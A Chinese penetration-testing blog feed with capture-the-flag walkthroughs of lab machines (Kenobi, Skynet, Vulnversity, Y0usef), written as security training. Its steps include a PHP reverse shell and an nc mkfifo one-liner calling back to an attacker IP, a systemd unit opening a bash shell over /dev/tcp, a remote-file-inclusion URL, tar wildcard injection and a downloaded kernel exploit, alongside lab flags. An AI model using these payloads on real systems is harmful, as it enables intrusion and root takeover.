私钥文件</td></tr><tr><td><strong>644</strong></td><td><code>rw-r--r--</code></td><td>读写</td><td>读</td><td>读</td><td>公共文件</td></tr><tr><td><strong>755</strong></td><td><code>rwxr-xr-x</code></td><td>读写执行</td><td>读执行</td><td>读执行</td><td>可执行脚本或程序</td></tr><tr><td><strong>777</strong></td><td><code>rwxrwxrwx</code></td><td>读写执行</td><td>读写执行</td><td>读写执行</td><td>开放权限，通常不推荐</td></tr></tbody></table><p>上面是一些常见的权限对应的用途 这里只能给600权限 太高权限会报错 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172132256.png" alt="image-20241117213225173"></p><p>这里给到600权限后 我们连上shell 拿到用户文件夹下的flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172133509.png" alt="image-20241117213330434"></p><p>What is Kenobi’s user flag (&#x2F;home&#x2F;kenobi&#x2F;user.txt)?</p><pre><code>d0b0f3f53b6caa532a83915e19224899</code></pre><h2 id="Privilege-Escalation-with-Path-Variable-Manipulation-suid提权之menu提权"><a href="#Privilege-Escalation-with-Path-Variable-Manipulation-suid提权之menu提权" class="headerlink" title="Privilege Escalation with Path Variable Manipulation(suid提权之menu提权)"></a>Privilege Escalation with Path Variable Manipulation(suid提权之menu提权)</h2><p>同样在拿到kenobi普通用户的shell之后 我们需要进行提权 进而拿到root用户的权限 也是先看一下有无可以利用的suid命令</p><pre><code>find / -type f -perm -u=s 2&gt;/dev/null</code></pre><p>这里看到 虽然同样是给了sudo和su 但是我们并不知道kenobi用户的登陆密码 因此这里我们选择使用meun来提权</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172136397.png" alt="image-20241117213630328"></p><p>我们尝试运行一下这个命令 发现在执行的时候会出现三个选项 选择不同选项之后会执行对应的命令并输出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172138243.png" alt="image-20241117213824161"></p><p>这里使用strings命令 可以在这个可执行的二进制程序中查找我们可读的字符串 看到了三个选项对应的三个会执行的命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172143205.png" alt="image-20241117214325146"></p><p>那我们这里使用命令劫持 伪造一个curl </p><pre><code>kenobi@kenobi:~$ cd /tmpkenobi@kenobi:/tmp$ echo /bin/sh &gt; curlkenobi@kenobi:/tmp$ chmod 777 curlkenobi@kenobi:/tmp$ export PATH=/tmp:$PATH</code></pre><p>意思就是在&#x2F;tmp中创建一个curl文件 将<code>/bin/sh</code>写入这个curl文件中并给予他777的权限 同时在环境变量中将将 <code>/tmp</code> 目录添加到最前面 并在 <code>/tmp</code> 之后，保留原有的路径列表 这样的话在我们执行命令的时候 会先从&#x2F;tmp文件夹中寻找并执行 这样就可以优先执行我们伪造的“curl”文件 进而执行<code>/bin/sh</code>命令 又因为我们在执行menu时 选择选项1 执行的是</p><pre><code>curl -I localhost</code></pre><p>这样在命令劫持之后就变成了</p><pre><code>/bin/sh -I localhost</code></pre><p>但是因为menu命令有suid权限 那此时执行的<code>/bin/sh</code>也就有了root权限 从而给我们返回一个root权限的shell</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172155130.png" alt="image-20241117215509068"></p><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>1.Samba 共享文件夹读取、下载远程靶机中的文件</p><p>2.proftpd 1.3.5的mod_copy 模块漏洞允许任意客户端将文件从文件系统的任何部分复制到选定的位置</p><p>3.将共享的远程文件夹挂载到本地文件夹中 复制出上一步移动的私钥文件 ssh连接普通用户</p><p>4.SUID提权 利用命令劫持 执行<code>/bin/sh</code>命令 拿到root权限的shell</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Offensive Pentesting-Skynet</title>
      <link href="/2024/11/26/Offensive%20Pentesting-Skynet/"/>
      <url>/2024/11/26/Offensive%20Pentesting-Skynet/</url>
      
        <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-Skynet"><a href="#Offensive-Pentesting-Skynet" class="headerlink" title="Offensive Pentesting-Skynet"></a>Offensive Pentesting-Skynet</h1><h2 id="扫端口-分析共享文件夹服务"><a href="#扫端口-分析共享文件夹服务" class="headerlink" title="扫端口 分析共享文件夹服务"></a>扫端口 分析共享文件夹服务</h2><p>拿到之后先扫端口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182033539.png" alt="image-20241118203335458"></p><p>同样发现了139和445端口 猜测存在共享目录 处理手法类似Kenobi</p><pre><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.220.154 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182123462.png" alt="image-20241118212335390"></p><p>根据这一部分</p><pre><code>|   SKYNET\milesdyson (RID: 1000)|     Full name:   |     Description: |_    Flags:       Normal user account</code></pre><p>可以判断出用户是milesdyson</p><p>同样发现了anonymous路径 共享的是<code>C:\srv\samba</code>目录 连接上看看有什么文件</p><pre><code>smbclient //10.10.53.137/anonymous</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182131231.png" alt="image-20241118213143153"></p><pre><code>smbget -R smb://10.10.53.137/anonymous</code></pre><p>两个有效文件 一个让修改密码 一个看起来是密码字典文件 应该是需要我们结合账户名milesdyson 来进行一个密码的爆破</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182133535.png" alt="image-20241118213331468"></p><h2 id="扫目录-发现邮件登陆页面"><a href="#扫目录-发现邮件登陆页面" class="headerlink" title="扫目录 发现邮件登陆页面"></a>扫目录 发现邮件登陆页面</h2><p>我们先访问一下网页</p><p>下面使用gobuster来扫目录</p><pre><code>gobuster dir -u http://10.10.220.154/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182137214.png" alt="image-20241118213759133"></p><p>发现一个关键的目录：&#x2F;squirrelmail 进行访问 发现是一个邮件管理系统的后台登陆页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182138044.png" alt="image-20241118213846975"></p><p>使用burpsuite进行抓包爆破 得到密码cyborg007haloterminator</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182148376.png" alt="image-20241118214811299"></p><p>What is Miles password for his emails?</p><pre><code>cyborg007haloterminator</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182150075.png" alt="image-20241118215055992"></p><p>登陆之后 可以看到第一封是一个密码重置的邮件</p><pre><code>)s&#123;A&amp;2Z=F^n_E.B` </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182248278.png" alt="image-20241118224847168"></p><h2 id="使用smbclient连接smb共享"><a href="#使用smbclient连接smb共享" class="headerlink" title="使用smbclient连接smb共享"></a>使用smbclient连接smb共享</h2><pre><code>smbclient -U milesdyson //10.10.49.13/milesdyson </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182330217.png" alt="image-20241118233005964"></p><p>在其中找到一个important.txt 导出</p><pre><code>1. Add features to beta CMS /45kra24zxs28v3yd2. Work on T-800 Model 101 blueprints3. Spend more time with my wife</code></pre><p>找到隐藏的CMS路径 <code>/45kra24zxs28v3yd</code> 访问一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411182338109.png" alt="image-20241118233813780"></p><p>What is the hidden directory?</p><pre><code>/45kra24zxs28v3yd</code></pre><h2 id="Cuppa-CMS存在远程文件包含漏洞"><a href="#Cuppa-CMS存在远程文件包含漏洞" class="headerlink" title="Cuppa CMS存在远程文件包含漏洞"></a>Cuppa CMS存在远程文件包含漏洞</h2><p>找到这个隐藏目录之后 我们先扫一下 看看有没有进一步可以利用的目录或者文件</p><pre><code>python3 dirsearch.py -u http://10.10.49.13/45kra24zxs28v3yd/ -i 200</code></pre><p>找到一个<code>administrator/ </code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191534967.png" alt="image-20241119153421896"></p><p>访问一下 发现是Cuppa CMS</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191535564.png" alt="image-20241119153518460"></p><p>搜一下这个CMS的漏洞 发现有远程文件包含 也就是<code>Remote File Inclusion</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191535897.png" alt="image-20241119153543837"></p><p>What is the vulnerability called when you can include a remote file for malicious purposes?</p><pre><code>remote file inclusion </code></pre><h3 id="利用文件包含读取当前用户的flag"><a href="#利用文件包含读取当前用户的flag" class="headerlink" title="利用文件包含读取当前用户的flag"></a>利用文件包含读取当前用户的flag</h3><p>我们先来看一下这个漏洞利用文件</p><pre><code>searchsploit -p 25971.txtcp /usr/share/exploitdb/exploits/php/webapps/25971.txt 25971.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191538074.png" alt="image-20241119153829015"></p><p>主要是这部分 在<code>alerts/alertConfigField.php</code>路径传入<code>urlConfig</code>参数就可以实现远程文件包含</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191539359.png" alt="image-20241119153906280"></p><p>burpsuite抓包 尝试读取用户文件夹下的flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191540009.png" alt="image-20241119154037894"></p><p>What is the user flag?</p><pre><code>7ce5c2109a40f958099283600a9ae807</code></pre><h2 id="远程文件包含反弹shell并提权"><a href="#远程文件包含反弹shell并提权" class="headerlink" title="远程文件包含反弹shell并提权"></a>远程文件包含反弹shell并提权</h2><p><a href="https://www.cnblogs.com/shacker/p/15943923.html">渗透测试之远程文件包含 - shacker_shen - 博客园</a></p><p>操作可以参考上面这篇文章 下面来进行我们的操作 </p><p>先创建一个<code>reverse_shell.txt</code></p><pre><code class="php">&lt;?php$ip=&quot;10.14.92.176&quot;;$port=2333;$sock = fsockopen($ip, $port);$descriptorspec = array(        0 =&gt; $sock,        1 =&gt; $sock,        2 =&gt; $sock);$process = proc_open(&#39;/bin/sh&#39;, $descriptorspec, $pipes);proc_close($process);?&gt;</code></pre><p>开启Apache服务 将这个反弹shell的文件复制到我们本地的网站根目录下</p><pre><code>systemctl start apache2.servicecp reverse_shell.txt /var/www/html/reverse_shell.txt</code></pre><p>在靶机网站中访问</p><pre><code>http://10.10.24.215/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.14.92.176/reverse_shell.txt?</code></pre><p>本机监听2333端口 成功反弹shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411191601218.png" alt="image-20241119160123155"></p><p>这里提权有两种方法</p><h3 id="内核版本漏洞提权"><a href="#内核版本漏洞提权" class="headerlink" title="内核版本漏洞提权"></a>内核版本漏洞提权</h3><p>看一下内核版本 </p><pre><code>uname -a</code></pre><p>发现是4.8.0 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411192113756.png" alt="image-20241119211318664"></p><p>searchsploit找一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411192115148.png" alt="image-20241119211515069"></p><p>使用43418.c </p><pre><code>searchsploit -p 43418.c cp /usr/share/exploitdb/exploits/linux/local/43418.c .cp 43418.c /var/www/html/43418.c</code></pre><p>在靶机上下载这个.c文件</p><pre><code>wget 10.14.92.176/43418.cgcc 43418.c -o pwn1chmod +x pwn1./pwn1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411192119096.png" alt="image-20241119211959014"></p><p>What is the root flag?</p><pre><code>3f0372db24753accc7179a282cd6a949</code></pre><h3 id="tar通配符提权"><a href="#tar通配符提权" class="headerlink" title="tar通配符提权"></a>tar通配符提权</h3><p>在用户文件夹下发现一个backups文件夹 里面有个backup.sh 内容是使用tar将网站根目录中的所有文件和文件夹进行打包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411221046929.png" alt="image-20241122104657848"></p><p>看一下定时任务</p><pre><code>cat /etc/crontab</code></pre><p>看起来是每隔一分钟执行一次 而且权限还是root</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411221048097.png" alt="image-20241122104851022"></p><p>两种做法 一种是反弹shell 一种直接创建一个二进制文件执行获得root权限</p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><pre><code>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.114.143 2333 &gt;/tmp/f&quot; &gt; shell.shtouch &quot;/var/www/html/--checkpoint-action=exec=sh shell.sh&quot;touch &quot;/var/www/html/--checkpoint=1&quot;</code></pre><p>在监听一下</p><pre><code>nc -lvvp 2333</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Offensive Pentesting-Vulnversity</title>
      <link href="/2024/11/26/Offensive%20Pentesting-Vulnversity/"/>
      <url>/2024/11/26/Offensive%20Pentesting-Vulnversity/</url>
      
        <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-Vulnversity"><a href="#Offensive-Pentesting-Vulnversity" class="headerlink" title="Offensive Pentesting-Vulnversity"></a>Offensive Pentesting-Vulnversity</h1><h2 id="nmap使用"><a href="#nmap使用" class="headerlink" title="nmap使用"></a>nmap使用</h2><table><thead><tr><th>Nmap flag</th><th>Description</th></tr></thead><tbody><tr><td>-sV</td><td>Attempts to determine the version of the services running</td></tr><tr><td>-p <x> or -p-</td><td>Port scan for port <x> or scan all ports</td></tr><tr><td>-Pn</td><td>Disable host discovery and scan for open ports</td></tr><tr><td>-A</td><td>Enables OS and version detection, executes in-build scripts for further enumeration</td></tr><tr><td>-sC</td><td>Scan with the default Nmap scripts</td></tr><tr><td>-v</td><td>Verbose mode</td></tr><tr><td>-sU</td><td>UDP port scan</td></tr><tr><td>-sS</td><td>TCP SYN port scan</td></tr></tbody></table><p>这里我们主要使用两个命令</p><pre><code>nmap -T4 -sC -sV 10.10.229.26 或 nmap -A -p- -v 10.10.229.26</code></pre><p>后面这个会比较慢 但是更为全面</p><pre><code>1. nmap -T4 -sC -sV 10.10.229.26-T4: 这个选项控制 nmap 的扫描速度和时间。T4 是一个优化选项，表示在扫描过程中提高扫描速度。-sC: 这个选项启用 默认脚本扫描，也就是使用 nmap 提供的默认脚本（Nmap Scripting Engine，NSE）。-sV: 这个选项启用 版本扫描，会探测目标主机上开放端口的服务版本信息。总结: nmap -T4 -sC -sV 10.10.229.26 是一个 快速扫描，进行 版本检测 和 默认脚本扫描，重点是发现开放端口和服务版本，同时利用默认脚本探测潜在的安全问题或配置问题。2. nmap -A -p- -v 10.10.229.26-A: 这个选项启用 主动扫描，包括多种扫描功能，包含了以下几项：操作系统检测 (OS detection): 尝试识别目标主机的操作系统类型和版本。版本扫描 (Version scanning): 类似于 -sV，识别目标主机的服务和版本。脚本扫描 (Nmap Scripting Engine): 执行多种与安全相关的脚本，类似于 -sC。Traceroute: 执行路由追踪，显示目标主机的路由路径。-p-: 这个选项指定 nmap 扫描 所有端口，即从 1 到 65535 的所有端口。默认情况下，nmap 只扫描常见的 1000 个端口，使用 -p- 可以确保扫描所有端口。-v: 这个选项启用 详细输出，会提供更多的扫描信息，包括扫描进度、发现的服务、操作系统信息等。总结: nmap -A -p- -v 10.10.229.26 是一个 全面扫描，执行操作系统检测、服务版本检测、脚本扫描、路由追踪，并且扫描所有端口。它提供了更多的信息和细节，适合用来进行全面的目标分析，尤其是在信息收集阶段。主要区别：扫描范围：nmap -T4 -sC -sV：只扫描常见的 1000 个端口，快速进行版本和脚本扫描。nmap -A -p- -v：扫描所有 65535 个端口，进行操作系统检测、版本检测、脚本扫描等更全面的扫描。扫描内容：nmap -T4 -sC -sV：使用默认脚本集、版本检测和较快的扫描速度。nmap -A -p- -v：进行更加全面的扫描，涵盖操作系统识别、服务版本、NSE 脚本、Traceroute 等。速度与信息：nmap -T4 -sC -sV 适用于 较快的扫描，并获取基本的版本和常见的安全漏洞信息。nmap -A -p- -v 适用于 全面的扫描，可以得到更加详细的信息，但也会需要更长的时间。总结：nmap -T4 -sC -sV 10.10.229.26 是一个快速且较为轻量的扫描，主要用于获取目标的版本信息和默认脚本扫描的结果。nmap -A -p- -v 10.10.229.26 是一个全面且深入的扫描，扫描所有端口并进行操作系统识别、服务版本检测、脚本扫描和路由追踪等。</code></pre><p>看一下扫描结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411152322027.png" alt="image-20241115232216910"></p><p>Scan the box; how many ports are open?</p><pre><code class="6">6</code></pre><p>What version of the squid proxy is running on the machine?</p><pre><code>3.5.12</code></pre><p>How many ports will Nmap scan if the flag <strong>-p-400</strong> was used?</p><pre><code>400</code></pre><p>What is the most likely operating system this machine is running?</p><pre><code>ubuntu</code></pre><p>What port is the web server running on?</p><pre><code>3333</code></pre><p>What is the flag for enabling verbose mode using Nmap?</p><pre><code>-v</code></pre><h2 id="gobuster使用"><a href="#gobuster使用" class="headerlink" title="gobuster使用"></a>gobuster使用</h2><table><thead><tr><th><strong>Gobuster 标志</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>-e</td><td>在控制台中打印完整的 URL</td></tr><tr><td>-u</td><td>目标 URL</td></tr><tr><td>-w</td><td>单词列表的路径</td></tr><tr><td>-U 和 -P</td><td>基本身份验证的用户名和密码</td></tr><tr><td>-p <strong><x></strong></td><td>用于请求的代理</td></tr><tr><td>-c <http Cookie></td><td>指定用于模拟身份验证的 Cookie</td></tr></tbody></table><p>在使用的时候需要指定字典的路径</p><pre><code>gobuster dir -u http://10.10.7.199:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411161112233.png" alt="image-20241116111237088"></p><p>扫除这个<code>/internal</code>路由之后 我们可以尝试访问一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411161736826.png" alt="image-20241116173614626"></p><p>What is the directory that has an upload form page?</p><pre><code>/internal/</code></pre><h2 id="文件上传-反弹shell"><a href="#文件上传-反弹shell" class="headerlink" title="文件上传(反弹shell)"></a>文件上传(反弹shell)</h2><p>在文件上传页面 我们直接写入反弹shell的马 ban了php后缀  就使用.phtml 上传成功</p><pre><code class="php">&lt;?php$ip=&quot;10.11.114.143&quot;;$port=2333;$sock = fsockopen($ip, $port);$descriptorspec = array(        0 =&gt; $sock,        1 =&gt; $sock,        2 =&gt; $sock);$process = proc_open(&#39;/bin/sh&#39;, $descriptorspec, $pipes);proc_close($process);?&gt;</code></pre><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411161946467.png" alt="imagep><p>成功上传后 访问</p><pre><code>http://10.10.40.101:3333/internal/uploads/反弹shell.phtml</code></pre><p>成功拿到shell 在创建一个交互式shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411161950028.png" alt="image-20241116195050982"></p><p>也找到了当前web服务的用户是bill和bill用户文件夹下的flag</p><p>What common file type you’d want to upload to exploit the server is blocked? Try a couple to find out.</p><pre><code>.php</code></pre><p>What extension is allowed after running the above exercise?</p><pre><code>.phtml</code></pre><p>What is the name of the user who manages the webserver?</p><pre><code>bill</code></pre><p>What is the user flag?</p><pre><code>8bd7992fbe8a6ad22a63361004cfcedb</code></pre><h2 id="提权-suid提权之systemctl"><a href="#提权-suid提权之systemctl" class="headerlink" title="提权(suid提权之systemctl)"></a>提权(suid提权之systemctl)</h2><p>这部分需要我们拿到root用户的flag 先看一下suid 虽然这里su和sudo也是suid权限 但是因为我们不知道bill用户的登陆密码 因此这里我们使用systemctl进行提权 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411162009608.png" alt="image-20241116200950474"></p><p>可以参考这篇文章<a href="https://www.cnblogs.com/yuy0ung/articles/18421470">Linux提权-suid相关提权思路 - Yuy0ung - 博客园</a></p><pre><code>因为systemctl有suid权限，所以可以创建一个systemctl service,里面写入反弹shell的命令，通过软链接，将创建的服务嵌入他的服务中，即可反弹shell 此时反弹的shell就是root权限</code></pre><p>先在我们的kali攻击机中编写一个shell.service</p><pre><code>[Unit]Description=reverseshell[Service]Type=oneshotExecStart=/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.11.114.143/1234 0&gt;&amp;1&#39;[Install]WantedBy=multi-user.target</code></pre><p>将这个service文件放到网站根目录中</p><pre><code>cp shell.service /var/www/html/shell.service</code></pre><p>开启apache服务</p><pre><code>systemctl start apache2.service</code></pre><p>在我们上一步反弹的shell中使用wget将这个service下载下来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411162018061.png" alt="image-20241116201849892"></p><p>将单元文件复制到<code>/dev/shm</code>目录并使用systemctl加载</p><pre><code>默认情况下，systemctl 命令是加载文档中所写的 /usr/lib/systemd/system/ 文件夹（此文件夹包含系统预定义的单元文件）和 /etc/systemd/system/ 文件夹（此文件夹包含用户定义的单元文件）。不过通常测试人员获取的低权限账号是不具备这两个目录写入权限的。由于临时目录 /tmp 中的内容可能会被随时更改或删除，所以 systemctl 也无法加载 /tmp 目录中的文件。那么解决方法是将服务单元文件放置在 /dev/shm 文件夹（Linux 中的共享内存文件系统，用于存放临时文件）下，该文件夹下的单元文件可以被 systemctl 正常加载且任意用户可写</code></pre><p>执行下面操作</p><pre><code>cp shell.service /dev/shm/shell.service</code></pre><p>使用systemctl加载服务单元文件</p><pre><code>systemctl link /dev/shm/shell.service# 建立链接systemctl enable --now /dev/shm/shell.service#启动服务   注：路径一定要写全</code></pre><p>加载成功 成功反弹shell到root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411162023545.png" alt="image-20241116202303326"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场Y0usef渗透测试wp</title>
      <link href="/2024/11/13/vulnhub%E9%9D%B6%E5%9C%BAY0usef%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95wp/"/>
      <url>/2024/11/13/vulnhub%E9%9D%B6%E5%9C%BAY0usef%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95wp/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶场Y0usef渗透测试wp"><a href="#vulnhub靶场Y0usef渗透测试wp" class="headerlink" title="vulnhub靶场Y0usef渗透测试wp"></a>vulnhub靶场Y0usef渗透测试wp</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>Get two flagDifficulty : easyThis works better with VirtualBox rather than VMware</code></pre><p>描述告诉我们这个靶场运行在virtualbox上比在vmware上更好 但是我没装 只能用vmware  直接导入下载的ova文件之后发生报错</p><pre><code>Capacity mismatch for disk H:\vulnhub靶场练习镜像\y0usef\y0usef\\y0usef-disk1.vmdk。</code></pre><p>大概就是告诉我们磁盘空间不匹配之类的 在网上找了个解决办法 先把ova文件解压 可以得到一个 vmdk 一个ovf文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411131634298.png" alt="image-20241113163426197"></p><p>记事本打开ovf文件 将里面内容全部删掉 替换为</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;Envelope ovf:version=&quot;1.0&quot; xml:lang=&quot;en-US&quot; xmlns=&quot;http://schemas.dmtf.org/ovf/envelope/1&quot; xmlns:ovf=&quot;http://schemas.dmtf.org/ovf/envelope/1&quot; xmlns:rasd=&quot;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_ResourceAllocationSettingData&quot; xmlns:vssd=&quot;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_VirtualSystemSettingData&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:vbox=&quot;http://www.virtualbox.org/ovf/machine&quot;&gt;  &lt;References&gt;    &lt;File ovf:id=&quot;file1&quot; ovf:href=&quot;y0usef-disk001.vmdk&quot;/&gt;  &lt;/References&gt;  &lt;DiskSection&gt;    &lt;Info&gt;Virtual disk information&lt;/Info&gt;    &lt;Disk ovf:capacity=&quot;30&quot; ovf:capacityAllocationUnits=&quot;byte * 2^30&quot; ovf:diskId=&quot;vmdisk1&quot; ovf:fileRef=&quot;file1&quot; ovf:format=&quot;http://www.vmware.com/interfaces/specifications/vmdk.html#streamOptimized&quot;/&gt;  &lt;/DiskSection&gt;  &lt;NetworkSection&gt;    &lt;Info&gt;Logical networks used in the package&lt;/Info&gt;    &lt;Network ovf:name=&quot;NAT&quot;&gt;      &lt;Description&gt;Logical network used by this appliance.&lt;/Description&gt;    &lt;/Network&gt;  &lt;/NetworkSection&gt;  &lt;VirtualSystem ovf:id=&quot;vm&quot;&gt;    &lt;Info&gt;A virtual machine&lt;/Info&gt;    &lt;EulaSection&gt;      &lt;Info&gt;License agreement for the virtual system&lt;/Info&gt;      &lt;License&gt;Go https://2ba.cc&lt;/License&gt;    &lt;/EulaSection&gt;    &lt;OperatingSystemSection ovf:id=&quot;96&quot;&gt;        &lt;Info&gt;The kind of installed guest operating system&lt;/Info&gt;        &lt;Description&gt;Debian_64&lt;/Description&gt;        &lt;vbox:OSType ovf:required=&quot;false&quot;&gt;Debian_64&lt;/vbox:OSType&gt;      &lt;/OperatingSystemSection&gt;    &lt;VirtualHardwareSection&gt;      &lt;Info&gt;Virtual hardware requirements&lt;/Info&gt;      &lt;System&gt;        &lt;vssd:ElementName&gt;Virtual Hardware Family&lt;/vssd:ElementName&gt;        &lt;vssd:InstanceID&gt;0&lt;/vssd:InstanceID&gt;        &lt;vssd:VirtualSystemIdentifier&gt;vm&lt;/vssd:VirtualSystemIdentifier&gt;        &lt;vssd:VirtualSystemType&gt;vm&lt;/vssd:VirtualSystemType&gt;      &lt;/System&gt;      &lt;Item&gt;        &lt;rasd:Caption&gt;1 virtual CPU&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;Number of virtual CPUs&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;1 virtual CPU&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;1&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceType&gt;3&lt;/rasd:ResourceType&gt;        &lt;rasd:VirtualQuantity&gt;1&lt;/rasd:VirtualQuantity&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:AllocationUnits&gt;MegaBytes&lt;/rasd:AllocationUnits&gt;        &lt;rasd:Caption&gt;1024 MB of memory&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;Memory Size&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;1024 MB of memory&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;2&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceType&gt;4&lt;/rasd:ResourceType&gt;        &lt;rasd:VirtualQuantity&gt;1024&lt;/rasd:VirtualQuantity&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:Address&gt;0&lt;/rasd:Address&gt;        &lt;rasd:Caption&gt;ideController0&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;IDE Controller&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;ideController0&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;3&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceSubType&gt;PIIX4&lt;/rasd:ResourceSubType&gt;        &lt;rasd:ResourceType&gt;5&lt;/rasd:ResourceType&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:Address&gt;1&lt;/rasd:Address&gt;        &lt;rasd:Caption&gt;ideController1&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;IDE Controller&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;ideController1&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;4&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceSubType&gt;PIIX4&lt;/rasd:ResourceSubType&gt;        &lt;rasd:ResourceType&gt;5&lt;/rasd:ResourceType&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:Address&gt;0&lt;/rasd:Address&gt;        &lt;rasd:Caption&gt;sataController0&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;SATA Controller&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;sataController0&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;5&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceSubType&gt;AHCI&lt;/rasd:ResourceSubType&gt;        &lt;rasd:ResourceType&gt;20&lt;/rasd:ResourceType&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:AddressOnParent&gt;0&lt;/rasd:AddressOnParent&gt;        &lt;rasd:Caption&gt;disk1&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;Disk Image&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;disk1&lt;/rasd:ElementName&gt;        &lt;rasd:HostResource&gt;/disk/vmdisk1&lt;/rasd:HostResource&gt;        